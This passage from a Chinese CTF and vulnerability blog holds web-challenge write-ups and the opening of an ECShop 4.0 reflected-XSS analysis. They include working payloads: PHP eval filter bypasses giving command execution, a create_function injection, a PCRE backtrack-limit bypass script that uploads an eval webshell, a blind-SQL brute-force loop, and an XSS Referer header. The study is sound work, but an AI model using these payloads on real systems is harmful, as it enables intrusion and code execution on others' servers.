<span class="keyword">if</span> <span class="string">'数据库操作失败'</span> <span class="keyword">in</span> zz.content:</span><br><span class="line">                pass</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">password</span> += <span class="keyword">chr</span>(j<span class="number">-1</span>)</span><br><span class="line">                print <span class="keyword">password</span></span><br><span class="line">                break</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            continue</span><br></pre></td></tr></table></figure>

<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-5d13e6227a9b2ad1.png" alt></p>
<p>但是这中写法是判断不出大小写的，尝试修改判断大小写后，爆出密码为：F1AG@1s-at_/fll1llag_h3r3，使用用户名密码登陆进去竟然还有一层</p>
<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-4076f8ade257663a.png" alt></p>
<p>看到这个“你可以在这里对远程数据库进行操作”，于是想到最近的一个mysql的安全问题：Rogue-MySql-Server，并且最近的DDCTF也出了这个问题的题目。并且github上mysqlserver伪造的项目：<a href="https://github.com/Gifts/Rogue-MySql-Server，在vps上跑脚本即可，并且上面得到的密码也有暗示，flag在文件fll1llag_h3r3中，查看下mysql.log。" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server，在vps上跑脚本即可，并且上面得到的密码也有暗示，flag在文件fll1llag_h3r3中，查看下mysql.log。</a></p>
<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-5abe785bea01fa71.png" alt></p>
<p><strong>FLAG值：</strong>flag{3f4abe8b-aa4a-bb48-c2f9f04d045beade}</p>
<h3 id="0x02-love-math"><a href="#0x02-love-math" class="headerlink" title="0x02 love math"></a>0x02 love math</h3><p>这题真的做了一天，到最后这题只有50多分了，真的是在下老了。<br>最开始发现可以计算还以为以为是SSTI……，查看网页源码可以拿到calc.php文件的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);</span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反正该ban的都ban了，也就是没法直接绕过正则，这题的意思就很明显了，就是需要应用给的math函数来进行构造，函数内的参数不可出现一些特殊字符和英文字符，查看官方文档可以发现base_convert可以进行2到36进制间的转换，所以最开始的思路是利用base_convert将payload进行进制转化，即转换为自由数字的字符串就行，即可构造出任意函数，构造system(ls)进行测试。<br>利用payload：base_convert(1751504350,10,36)(base_convert(784,10,36))，列出/html/根目录，看到目录列出来的时候大喜，感觉一血就在眼前，然后gg了。<br>由于特殊字符无法进行36进制和10进制间的转换，所以想要直接按前面的payload构造system(cat f*)是不可能的，后来是将exec(cat f*)中的‘cat f*’转换为16进制，再转换为10进制，利用dechex函数和hex2bin函数进行还原，hex2bin利用base_convert转换为10进制，就这个地方卡死了，因为80位长度的限制，我最短也就构造了81位，真的是难受。<br>刚好之前有接触过rand^(x).(x)的操作，通过异或可以构造出大写英文字符，所以想着能不能拼接一个$_GET或者$_POST出来，就不要考虑代码里的限制了，最终利用rand^(7).(5)构造出了’ET’，用is_nan^(6).(4)构造出了’_G’,在拼接起来就构造出了_GET，思路就是将$content构造为$_GET[a]( $_GET[b]),a参数构造为system函数，b参数当作system函数的参数，即可绕过限制，执行任意命令。关键是将_GET构造成$_GET函数，在本地配置测试环境</p>
<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-a3f096398526363b.png" alt></p>
<p>构造payload：<a href="http://192.168.44.129/web2.php?c=2333;\$_GET%5ba%5d(\$_GET%5bb%5d)&amp;a=system&amp;b=ls" target="_blank" rel="noopener">http://192.168.44.129/web2.php?c=2333;\$_GET%5ba%5d(\$_GET%5bb%5d)&amp;a=system&amp;b=ls</a><br><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-43ae652631f185cb.png" alt></p>
<p>所以接下主要要解决的就是构造$_GET，正则上不会过滤MATH函数名、大括号等，所以可以利用这点用来构造变量覆盖来从而构造payload，其中中括号[]可以用大括号替代，最终构造：$cos=(is_nan^(6).(4)).(rand^(7).(5));$$cos{atan}($$cos{atanh})，即$cos=’_GET’,$$cos覆盖后为$_GET,所以通过变量覆盖后最终为$_GET{atan}($_GET{atanh}),所以直接给参数atan和atanh赋值，可以实现任意代码执行，最终构造：2333333;$cos=(is_nan^(6).(4)).(rand^(7).(5));$$cos{atan}($$cos{atanh})&amp;atan=system&amp;atanh=cat flag.php，其中2333333;用于闭合echo，不过不闭合也可以的，便可得到flag。<br>后来继续测试了一下，发现利用exec(nl *)进行缩短竟然可以缩到79位（吐血）！！！……这里直接贴缩的payload：base_convert(47138,20,36)(base_convert(1438255411,14,34)(dechex(474260465194)))，其中hex2bin进行14/34进制的转换，exec进行20/36进制的转换就可以达到79位。<br>这道题的解法比较多，比如在构造$cos=(is_nan^(6).(4)).(rand^(7).(5));$$cos{atan}($$cos{atanh})时，$$cos{atan}可以直接利用base_convert函数将system或者eval进行10/36进制转换进行利用。<br>如果没有过滤反引号，其实会简单很多，可以参考P神的：<a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">无字母数字Webshell之提高篇 </a>闭合前一段&lt;?php，利用&lt;?=开辟代码，通过’`. /???/???/????/????.????`‘来打印文件内容，详细的可以本地测试调试不做过多说明。</p>
<p><strong>FLAG值：</strong>flag{86fed0d1-42ec-46ba-83ee-7dedd09303fb}</p>
<h3 id="0x03-RefSpace"><a href="#0x03-RefSpace" class="headerlink" title="0x03 RefSpace"></a>0x03 RefSpace</h3><p>路走错了，跑去逆向文件了。这个还是等大佬的wp了</p>
<p><strong>个人觉得Web没那么简单，被刷到两位数的分有点意外到，不多说。</strong></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>SQL</tag>
        <tag>反序列化</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计知识星球二周年练手</title>
    <url>/2019/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4%E7%BB%83%E6%89%8B/</url>
    <content><![CDATA[<h3 id="easy-function"><a href="#easy-function" class="headerlink" title="easy_function"></a>easy_function</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span></span><br><span class="line"><span class="php">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    $action(<span class="string">''</span>, $arg);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>正则禁用了a-z0-9_，同时匹配了^$，即在开头结尾加上符合正则的字符就可以绕过后续字符串的匹配，所以思路就是fuzz一下开头结尾，看看会不会存在某个字符使得整个字符串可以绕过正则且函数可以正常执行，写一个fuzz脚本👇</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="meta"># @Author: Cyc1e</span></span><br><span class="line"><span class="meta"># @Date:   2019-10-11 08:44:54</span></span><br><span class="line"><span class="meta"># @Last Modified by:   Cyc1e</span></span><br><span class="line"><span class="meta"># @Last Modified time: 2019-10-11 08:53:12</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://127.0.0.1/2018/function/www/index.php?action='</span></span><br><span class="line"><span class="keyword">for</span> i in xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">	<span class="keyword">char</span> = chr(i) + <span class="string">'phpinfo'</span></span><br><span class="line">	url1 = url + <span class="keyword">char</span></span><br><span class="line">	req = requests.<span class="keyword">get</span>(url = url1)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'PHP Version 7.1.9'</span> in req.text:</span><br><span class="line">		print hex(i) + <span class="string">':'</span> + <span class="keyword">char</span></span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>把源码中<code>$action(&#39;&#39;, $arg);</code>改成<code>$action(&#39;);</code>，跑下fuzz就好了👇</p>
<p><img src="/2019/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4%E7%BB%83%E6%89%8B/8418106-855bde98c6141482.png" alt></p>
<p>所以前面的字符加上\（即命名空间），就可以绕过正则正常执行，接下在就是构造一个两个参数的函数，并且第二个参数可控，利用create_function的代码注入就可以了，参数arg的为👇</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">arg</span>=Cyc1e<span class="comment">;&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
<p>就可以执行任意函数了~</p>
<h3 id="pcrewaf"><a href="#pcrewaf" class="headerlink" title="pcrewaf"></a>pcrewaf</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (is_php($data)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    @mkdir($user_dir, <span class="number">0755</span>);</span></span><br><span class="line"><span class="php">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>P神的具体分析：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a><br>PHP由于 <strong>.*</strong> 匹配了任意字符，而后的 <strong>[(`;?&gt;]</strong> 匹配中会进行回溯，并且默认设置回溯的次数为100W次，若回溯次数超过100W次，则返回值为false，利用此来绕过<code>if (is_php($data))</code>的判断，直接执行到文件操作代码，P神的POC👇</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> io import BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(b<span class="string">'aaa&lt;?php eval($_POST[txt]);//'</span> + b<span class="string">'a'</span> * 1000000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://51.158.75.42:8088/index.php'</span>, <span class="attribute">files</span>=files, <span class="attribute">allow_redirects</span>=<span class="literal">False</span>)</span><br><span class="line"><span class="builtin-name">print</span>(res.headers)</span><br></pre></td></tr></table></figure>
<p>若判断设置为强等于，即‘===’，则返回false一样判断为‘bad request’。</p>
<p>#phplimit</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>正则也就是限定了code只能传入php函数，无法构造任意的字符串，那么想要摆脱限制，也就是不在参数中进行构造，利用get参数将构造的包含就行了，这里贴个图👇</p>
<p><img src="/2019/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4%E7%BB%83%E6%89%8B/8418106-dfdc5515bff56a77.png" alt></p>
<p>题目事nginx环境，所以也就是用eval(implode(reset(get_defind_vars())))构造就好了。</p>
<h3 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span></span><br><span class="line"><span class="php">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">chdir(DATA_DIR);</span></span><br><span class="line"></span><br><span class="line"><span class="php">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span></span><br><span class="line"><span class="php">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Required meta tags --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap CSS --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css"</span> <span class="attr">integrity</span>=<span class="string">"sha256-eSi1q2PG6J7g7ib17yAaWMcrr5GrtohYChqibrV7PBE="</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Domain Detail<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    pre &#123;</span><br><span class="line">        width: 100%;</span><br><span class="line"><span class="css">        <span class="selector-tag">background-color</span>: <span class="selector-id">#f6f8fa</span>;</span></span><br><span class="line">        border-radius: 3px;</span><br><span class="line">        font-size: 85%;</span><br><span class="line"><span class="css">        <span class="selector-tag">line-height</span>: 1<span class="selector-class">.45</span>;</span></span><br><span class="line">        overflow: auto;</span><br><span class="line">        padding: 16px;</span><br><span class="line"><span class="css">        <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#ced4da</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group mt-3"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group-prepend"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-text"</span> <span class="attr">id</span>=<span class="string">"basic-addon1"</span>&gt;</span>dig -t A -q<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"domain"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Your domain"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group-append"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-outline-secondary"</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>执行<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pre</span> <span class="attr">class</span>=<span class="string">"mt-3"</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span></span><br><span class="line"><span class="php">                $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span></span><br><span class="line"><span class="php">                $output = shell_exec($command);</span></span><br><span class="line"></span><br><span class="line"><span class="php">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span></span><br><span class="line"></span><br><span class="line"><span class="php">                $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span></span><br><span class="line"><span class="php">                <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span></span><br><span class="line"><span class="php">                    file_put_contents($log_name, $output);</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> $output;</span></span><br><span class="line"><span class="php">            <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>ECShop 4.0反射型XSS漏洞分析</title>
    <url>/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><strong>原文已发<a href="https://www.freebuf.com/vuls/198140.html" target="_blank" rel="noopener">Freebuf ECShop 4.0反射型XSS漏洞分析 </a></strong><br><strong>前言</strong>： Ecshop是国内的一款开源的电商框架，在国内应用较为广泛，当前最新版本为4.0.0，最近对其代码进行了简单的分析，发现可以绕过其filter触发XSS。</p>
<h2 id="一、漏洞利用方式"><a href="#一、漏洞利用方式" class="headerlink" title="一、漏洞利用方式"></a><strong>一、漏洞利用方式</strong></h2><p>发送GET请求包如下：</p>
<blockquote>
<p>GET/CMS/ECShop_V4.0./user.php HTTP/1.1<br>Referer:<a href="https://127.0.0.1&quot;" target="_blank" rel="noopener">https://127.0.0.1&quot;</a> /&gt;&lt;a href=j&amp;#97v&amp;#97script:&amp;#97lert(‘Cyc1e_test’)&gt;&lt;imgsrc=”xxxxx<br>User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko)Chrome/41.0.2228.0 Safari/537.21<br>Cookie:ECS_ID=17b608d2a679cf2c7e8611581478e6929dbfb34b;ECS[visit_times]=2<br>Connection:<br>keep-aliveAccept: <em>/</em><br>Accept-Encoding:gzip,deflate<br>Host: 127.0.0.1</p>
</blockquote>
<p>其中漏洞触发代码为：</p>
<figure class="highlight leaf"><table><tr><td class="code"><pre><span class="line">Referer:https://127.0.0.1" /&gt;&lt;ahref=j&amp;#97v&amp;#97script:&amp;<span class="function"><span class="keyword">#</span>97<span class="title">lert</span><span class="params">('<span class="variable">Cyc1e_test</span>')</span></span>&gt;&lt;imgsrc="xxxxx</span><br></pre></td></tr></table></figure>

<p>实现绕过过滤规则，触发XSS漏洞的效果。</p>
<p><strong>二、相关环境</strong></p>
<p>版本：ECShop4.0.0</p>
<p>漏洞类型：反射型XSS</p>
<p>本地环境：php5.6.27+ Apache + Mysql</p>
<p><strong>三、漏洞分析</strong></p>
<p>该XSS漏洞路口点在user.php文件，查看user.php：328行</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-3f519e16f6df1c85.jpg" alt></p>
